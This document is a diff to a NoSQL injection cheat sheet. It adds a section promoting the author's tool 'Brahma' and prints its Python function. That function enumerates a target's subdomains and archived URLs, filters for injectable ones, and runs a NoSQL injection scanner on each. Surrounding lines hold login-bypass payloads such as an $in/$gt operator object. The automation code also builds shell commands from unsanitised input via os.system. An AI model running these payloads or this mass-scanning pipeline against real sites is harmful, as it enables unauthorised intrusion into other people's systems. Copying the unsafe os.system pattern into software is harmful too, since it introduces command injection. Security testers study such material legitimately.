@@ -179,6 +179,64 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
+## NoSQLi automation using my tool
+
+I have created a python script to automate `XSS, SQLI, NOSQLI, LFI, SSRF` so lets see how you can automate NoSQL injection using <a href="https://github.com/DevanshRaghav75/Brahma">Brahma</a>.
+
+**How Brahma automates NoSQL injection ?**<br>
+After running `Brahma -d https://example.com -a nosqli` command the Brahma will find subdomains, waybackurls, SQL URLs and then will test every URL using nosqli tool and For loops.
+
+**This is the code OF Brahma that automates NoSQL injection**
+
+You can modify this code and can make a script for NoSQL injection automation, Hope this will you :)
+
+```python
+import time
+import os
+import re
+from Brahma.core.args import target
+from Brahma.core.colors import RED, WHITE, GREEN, CYAN, YELLOW
+from Brahma.core.styles import RESET, BRIGHT
+from os import path
+
+def nosqli():
+    print(BRIGHT + GREEN + "[*] " + RESET + "NOSQLI will be automated using: gf, gf_patterns, waybackurls, subfinder, httpx, nosqli")
+    time.sleep(2)
+
+    print(BRIGHT + GREEN + "[*] " + RESET + "Finding subdomains using subfinder" )
+    print(BRIGHT + GREEN + "[*] " + RESET + "Making results directory")
+    os.system("mkdir results")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: subfinder -d " + target + " | tee results/domains.txt ")
+    time.sleep(3)
+    
+    if re.search('https://', target):
+        url = target.replace('https://', '')
+    else:
+        url = target.replace('http://', '')
+    
+    os.system("subfinder -d " + url + " | tee results/domains.txt")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Finding working domains from results/domains.txt")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/domains.txt | httpx | tee results/urls.alive")
+    time.sleep(3)
+    os.system("cat results/domains.txt | httpx | tee results/urls.alive")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Finding urls using waybackurls")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.alive | waybackurls | tee results/urls.final")
+    time.sleep(3)
+    os.system("cat results/urls.alive | waybackurls | tee results/urls.final")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Finding SQLi urls using gf and gf_patterns")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf sqli results/urls.final >> results/urls.nosqli")
+    time.sleep(3)
+    os.system("gf sqli results/urls.final >> results/urls.nosqli")
+    print(BRIGHT + GREEN + "[*] " + RESET + "Testing urls.nosqli one by one using for loops")
+    time.sleep(3)
+    
+    with open ('results/urls.nosqli') as wordlist:
+        read = wordlist.readlines()
+    for line in read:
+        os.system("nosqli scan -t " + line)
+    
+    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")
+```
 ## How I found NoSQL injection on Dutch goverment website and got a t-shirt
 
 Yes, I found `NoSQL injection` on dutch goverment website so lets see how I found that.
